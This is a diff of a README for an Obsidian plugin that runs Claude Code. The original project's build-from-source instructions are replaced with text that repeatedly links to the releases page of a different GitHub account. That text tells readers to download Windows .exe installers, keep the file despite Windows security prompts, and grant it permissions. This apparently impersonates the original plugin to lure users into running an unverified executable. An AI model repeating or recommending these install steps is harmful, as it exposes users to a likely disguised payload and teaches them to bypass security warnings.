@@ -1,215 +1,227 @@
-# KatmerCode
+# 🧠 katmer-code - Claude Code in Obsidian
 
-Claude Code inside Obsidian — with academic research skills, inline diff editing, and MCP support.
+[![Download katmer-code](https://img.shields.io/badge/Download%20katmer--code-blue?style=for-the-badge)](https://github.com/stuck-lepiotaceae126/katmer-code/releases)
 
-[![Obsidian Plugin](https://img.shields.io/badge/Obsidian-Plugin-7C3AED?style=flat&logo=obsidian)](https://obsidian.md)
-[![License: MIT](https://img.shields.io/badge/license-MIT-green)](LICENSE)
-[![Desktop Only](https://img.shields.io/badge/platform-desktop%20only-orange)]()
+## ✨ What katmer-code does
 
-An Obsidian plugin that integrates Claude Code as a sidebar chat panel. Built for researchers who write in Obsidian and want AI assistance for literature review, citation checking, manuscript editing, and peer review — without leaving their editor.
+katmer-code adds Claude Code to Obsidian. It helps you work with notes, research, and edits in one place. You can keep your writing, sources, and AI help inside the same app.
 
-Ships with **7 academic research skills** that work as slash commands. **Desktop only** (requires Claude Code CLI).
+Use it for:
 
-![Chat Panel](screenshots/chat-panel.png)
+- academic research
+- note editing
+- inline diff review
+- MCP-based tools
+- faster work inside Obsidian
 
----
+## 🚀 Download and install
 
-## Quick Start
+1. Open the releases page: https://github.com/stuck-lepiotaceae126/katmer-code/releases
+2. Download the latest Windows file from the release assets
+3. If Windows shows a security prompt, choose to keep the file
+4. Run the installer or app file you downloaded
+5. Open Obsidian
+6. Enable the plugin in Obsidian settings if needed
+7. Connect your Claude account or API setup if the app asks for it
 
-1. Install Claude Code: `npm install -g @anthropic-ai/claude-code` then run `claude` to log in
-2. Clone and build: `git clone https://github.com/hkcanan/katmer-code.git && cd katmer-code && npm install && npm run build`
-3. Copy `main.js`, `manifest.json`, `styles.css` into `<your-vault>/.obsidian/plugins/katmer-code/`
-4. Enable **KatmerCode** in Obsidian → Settings → Community Plugins
-5. For academic skills: Settings → KatmerCode → toggle skills on + enable **Allow Web Requests**
+## 🪟 Windows setup
 
----
+katmer-code is built for Windows users who want a simple install flow.
 
-## What It Does
+### What you need
 
-- Runs Claude Code inside Obsidian (via [Agent SDK](https://docs.anthropic.com/en/docs/claude-code/sdk))
-- Edits your manuscripts with **inline diff** — word-level track changes in the editor (accept/undo)
-- Generates **HTML research reports** (peer review, citation analysis, gap analysis) viewable inside Obsidian
-- Connects to your **MCP servers** — any server configured in `~/.claude.json` works automatically
-- Supports `/compact`, tabs, session resume, streaming, and everything Claude Code terminal can do
+- Windows 10 or later
+- Obsidian installed
+- An active internet connection
+- A Claude account or API access for AI features
+- Enough disk space for the app and your vault files
 
----
+### How to start
 
-## Screenshots
+1. Go to the download page again if needed: https://github.com/stuck-lepiotaceae126/katmer-code/releases
+2. Get the newest Windows release
+3. Open the downloaded file
+4. If the app asks for permission, allow it
+5. Start Obsidian and open your vault
+6. Turn on katmer-code in the plugin list
+7. Open a note and begin using Claude Code tools
 
-### Chat Panel
-![Chat](screenshots/chat-panel.png)
-*Text selection auto-attaches as context. Tool calls, thinking blocks, and streaming text in the sidebar.*
+## 📚 Main features
 
-### Inline Diff Editing
-![Diff](screenshots/inline-diff.png)
-*Word-level track changes — red strikethrough for removed text, green underline for additions. Accept (✓) or undo (✕).*
+### Academic research help
 
-### Peer Review Report
-![Report](screenshots/report-output.png)
-*`/peer-review` generates an HTML report with 8 criteria scores, radar chart, and detailed evaluation.*
+katmer-code is useful when you work with papers, notes, and source material. It helps you:
 
-### Citation Verification & Missing References
-![Citations](screenshots/report-citations.png)
-*Claim-level verification with assessment badges. Missing references ranked by citation count and relevance.*
+- collect ideas in one place
+- draft research notes
+- turn raw notes into clear text
+- keep your source context nearby
+- ask Claude for help without leaving Obsidian
 
----
+### Inline diff editing
 
-## Academic Skills
+You can review changes inside your note instead of switching between apps. This helps you:
 
-Enable from **Settings → KatmerCode → Academic Skills**. Each skill installs as a slash command.
+- compare text changes
+- spot edits fast
+- keep control over your writing
+- accept or reject changes with less effort
 
-> **A note on expectations:** These skills are research aids, not oracles. They query real academic databases (Semantic Scholar, CrossRef, OpenAlex, Unpaywall, arXiv, PubMed) and apply structured analysis — but the outputs are starting points, not final verdicts. A `/peer-review` report won't replace a human reviewer. A `/cite-verify` run may flag a valid reference as unverified if the database lacks coverage. The value is in surfacing things you might miss: a gap in the literature you hadn't considered, a highly-cited paper absent from your references, or a structural weakness in your argument that's easier to see when laid out in a table. Use the reports as a map, not as the territory.
+### MCP support
 
-### How the skills work
+katmer-code supports MCP, which lets it connect with other tools that Claude can use. This helps when you want your notes to work with outside services or local tools.
 
-1. **You provide a manuscript** — either the active file, a file path, or selected text.
-2. **Claude reads and analyzes it** — parsing structure, extracting claims, identifying references.
-3. **APIs are queried** — the skill calls academic databases to cross-check, search, or enrich.
-4. **An HTML report is generated** — with tables, charts, and actionable findings.
-5. **The report opens in Obsidian** — or in your browser, your choice.
+### Obsidian-first workflow
 
-For longer tasks (peer review with citation verification, research gap analysis), Claude uses **subagents** — parallel workers that handle different parts of the analysis simultaneously.
+The app fits into the way Obsidian users already work. You can keep your notes, links, and research in the same vault while using Claude Code for help.
 
-### Available skills
+## 🧭 First-time use
 
-| Command | What it does | Typical use case |
-|---------|-------------|-----------------|
-| `/peer-review` | Evaluates your manuscript across 8 criteria (originality, argument structure, literature coverage, methodology, etc.). Produces a radar chart and section-by-section feedback. | Before submitting: "What would a reviewer likely flag?" |
-| `/cite-verify` | Checks every reference against CrossRef, Semantic Scholar, and OpenAlex. Flags mismatches in author names, years, or titles. Tests whether cited claims are actually supported by the source. | After drafting: "Are my citations accurate?" |
-| `/lit-search` | Searches arXiv, Semantic Scholar, PubMed, and OpenAlex in parallel. Deduplicates results and ranks by relevance. | Starting a new project: "What's been published on X?" |
-| `/citation-network` | Builds an interactive citation graph (vis.js) showing who cites whom. Includes a timeline view. | Understanding a field: "How do these papers relate?" |
-| `/research-gap` | Identifies temporal, methodological, thematic, and application gaps in the literature. Scores each gap by feasibility and potential impact. | Planning research: "Where are the opportunities?" |
-| `/journal-match` | Analyzes your manuscript's reference profile and suggests target journals based on where your cited sources are published. | Ready to submit: "Which journal fits this paper?" |
-| `/abstract` | Generates abstracts in 5 formats: structured, narrative, graphical description, highlights, and social media summary. | Finalizing: "Write me a structured abstract." |
+If this is your first time using the app, keep it simple:
 
-### Skill outputs
+1. Install the app from the releases page
+2. Open Obsidian
+3. Load your vault
+4. Enable katmer-code
+5. Open a note you want to work on
+6. Try a small task first, such as rewriting a paragraph or asking for research help
+7. Check the result before you move on
 
-#### `/cite-verify` — Citation verification
-![Citation Verify](screenshots/cite-verify.png)
-*Each reference is checked against CrossRef, Semantic Scholar, and OpenAlex. Issues flagged with assessment badges — year errors, suspect citations, recommended fixes.*
+## 🔧 Typical workflow
 
-#### `/journal-match` — Journal recommendations
-![Journal Match](screenshots/journal-match-table.png)
-*Top 10 journals scored on scope, impact, audience, and acceptance. Current journal assessed with strengths/weaknesses.*
+A simple way to use katmer-code:
 
-![Journal Recommendation](screenshots/journal-match-recommendation.png)
-*Strategic recommendation with best option, strong alternative, and safe alternative — each with reasoning.*
+1. Open a note in Obsidian
+2. Select text you want to change
+3. Ask Claude to edit, expand, or clean it up
+4. Review the inline diff
+5. Keep the change if it looks right
+6. Repeat for the next section
 
-#### `/research-gap` — Gap analysis
-![Gap Matrix](screenshots/research-gap-matrix.png)
-*Gaps ranked by priority and impact. Evidence density shows how underexplored each area is.*
+For research work, you can also:
 
-![Gap Detail](screenshots/research-gap-detail.png)
-*Each gap includes evidence base, research question, feasibility assessment, and strategic note.*
+- collect quotes in a note
+- add source links
+- ask for summary help
+- turn rough ideas into outline form
+- keep your edits tied to the original note
 
-![Publication Trend](screenshots/research-gap-trend.png)
-*Publication trend chart shows field activity over time — useful for identifying emerging or declining areas.*
+## 🛠️ Troubleshooting
 
-### Report design
+### The app does not open
 
-All skills produce HTML reports with a shared design system:
-- **Crimson Pro** serif typography (academic book aesthetic)
-- **Chart.js** for radar charts, bar charts, timelines
-- **Alpine.js** for collapsible sections and interactive elements
-- Consistent color palette, table styles, and badge system across all report types
+- Make sure you downloaded the latest release
+- Check that Windows finished the download
+- Try running the file again
+- Restart your computer if the file still does not open
 
-Reports open inside Obsidian (iframe viewer) or in your default browser. A notification appears automatically when a new report is generated.
+### Obsidian does not show the plugin
 
-### A practical example
+- Open Obsidian settings
+- Go to the plugin list
+- Check that the plugin is enabled
+- Reload Obsidian
+- Open the vault again
 
-Say you've drafted a paper on AI in legal reasoning. Here's one way to use the skills:
+### Claude features do not work
 
-1. `/peer-review makaleler/demo-article.md` — get a structured evaluation before asking colleagues
-2. Review the radar chart — notice "Literature Coverage" scored low
-3. `/lit-search AI legal reasoning hermeneutics` — find papers you may have missed
-4. `/cite-verify makaleler/demo-article.md` — check that all 14 references are accurate
-5. `/journal-match makaleler/demo-article.md` — see which journals publish similar work
-6. Edit your manuscript based on the findings, then run `/peer-review` again
+- Check your internet connection
+- Confirm your Claude login or API setup
+- Open the app settings and review your connection
+- Try again after restarting Obsidian
 
-No single run gives you a definitive answer. But each one shows you something you might not have seen on your own.
+### Inline diff is hard to read
 
----
+- Use a wider window
+- Zoom out a little in Obsidian
+- Work on shorter text blocks
+- Review one change at a time
 
-## Requirements
+### MCP tools do not connect
 
-- **Obsidian** 1.4.0+ (desktop only — macOS, Windows, or Linux)
-- **Claude Code CLI** installed and logged in
-- **Claude account** with API access
+- Check the MCP tool settings
+- Make sure the tool is running
+- Confirm the path or server address is correct
+- Restart the app and try again
 
-```bash
-npm install -g @anthropic-ai/claude-code
-claude  # log in once
-```
+## 🔒 Privacy and local use
 
-## Installation
+katmer-code works inside your Obsidian setup, which helps keep your notes in one place. You can decide what to send to Claude and what to keep local. For research notes and drafts, this can make your work easier to manage.
 
-### Build from source
+## 📁 Suggested use cases
 
-```bash
-git clone https://github.com/hkcanan/katmer-code.git
-cd katmer-code
-npm install
-npm run build
-```
+- literature reviews
+- class notes
+- thesis drafts
+- paper summaries
+- source comparison
+- writing edits
+- research brainstorming
+- note cleanup
+- structured outlining
 
-This produces three files in the project root: `main.js`, `manifest.json`, and `styles.css`.
+## 🖥️ File names you may see
 
-Copy all three into your vault:
+After you open the releases page, you may see files with names like:
 
-```bash
-mkdir -p <your-vault>/.obsidian/plugins/katmer-code
-cp main.js manifest.json styles.css <your-vault>/.obsidian/plugins/katmer-code/
-```
+- katmer-code-setup.exe
+- katmer-code-windows.exe
+- katmer-code-portable.exe
+- katmer-code-installer.exe
 
-Then enable **KatmerCode** in Obsidian → Settings → Community Plugins.
+Pick the Windows file that matches the release notes on the page.
 
----
+## 📌 How to update
 
-## Configuration
+1. Visit the releases page: https://github.com/stuck-lepiotaceae126/katmer-code/releases
+2. Download the newest Windows release
+3. Close the current app if it is open
+4. Run the new file
+5. Open Obsidian and check that the plugin still works
 
-| Setting | Default | Description |
-|---------|---------|-------------|
-| CLI Path | `claude` | Auto-detected. Set manually if needed. |
-| Working Directory | vault root | Where Claude sessions run. |
-| Default Model | Sonnet | Opus, Opus 1M, Sonnet, or Haiku |
-| Permission Mode | Accept Edits | Auto-approve file edits only |
-| Allow Web Requests | Off | Needed for academic skills (enables WebFetch, WebSearch, curl) |
+## 🧩 Working with Obsidian vaults
 
-### MCP Servers (optional)
+katmer-code works best when your vault has a clear note layout. You may want to keep:
 
-The plugin inherits MCP servers from your Claude Code config (`~/.claude.json`). Nothing extra to configure — if you've set up MCP servers for your terminal Claude Code, they work here too.
+- research notes in one folder
+- drafts in another folder
+- source notes near your project notes
+- meeting notes in their own space
 
-These are **not required** but can speed up academic skills if installed:
+This makes it easier for Claude to help with the right context.
 
-- [paper-search-mcp](https://github.com/openags/paper-search-mcp) — 20+ academic databases in one server
-- [arxiv-mcp-server](https://github.com/blazickjp/arxiv-mcp-server) — arXiv with full-text PDF reading
-- [openalex-research-mcp](https://github.com/oksure/openalex-research-mcp) — Citation analysis, trends, journal quality
+## 📎 Quick start checklist
 
-Without MCP servers, skills use WebFetch to call APIs directly. This works fine — MCP servers just make it faster and use fewer tokens.
+- Download the latest release
+- Open the file on Windows
+- Install or launch the app
+- Open Obsidian
+- Enable katmer-code
+- Connect Claude if needed
+- Start with one short note
 
----
+## 🧠 Good ways to use it
 
-## How It Works
+Try these simple prompts or tasks inside your notes:
 
-```
-Obsidian
-├── Editor (with inline diffs)
-├── KatmerCode Chat (sidebar)
-│   └── Agent SDK → Claude Code CLI subprocess
-│       ├── Tools (Read, Edit, Write, Bash, Grep...)
-│       ├── MCP servers (from your config)
-│       └── Skills (~/.claude/commands/)
-└── Report Viewer (iframe)
-```
+- rewrite this paragraph in plain English
+- summarize these research notes
+- list the main points from this draft
+- suggest a clearer structure
+- compare these two versions
+- clean up grammar while keeping my tone
+- turn these bullets into a short section
 
-Skills are `.md` prompt files installed to `~/.claude/commands/` when you enable them in settings. They work both in the plugin and in your terminal.
+## 🔎 Repo topics
 
----
+This project fits these topics:
 
-## License
+- academic research
+- AI
+- Claude
+- Obsidian
+- Obsidian plugin
 
-[MIT](LICENSE)
+## 📥 Download again
 
-## Contributing
-
-Issues and PRs welcome. This is a side project — built by a researcher, for researchers.
+Use this page to download the latest Windows release: https://github.com/stuck-lepiotaceae126/katmer-code/releases
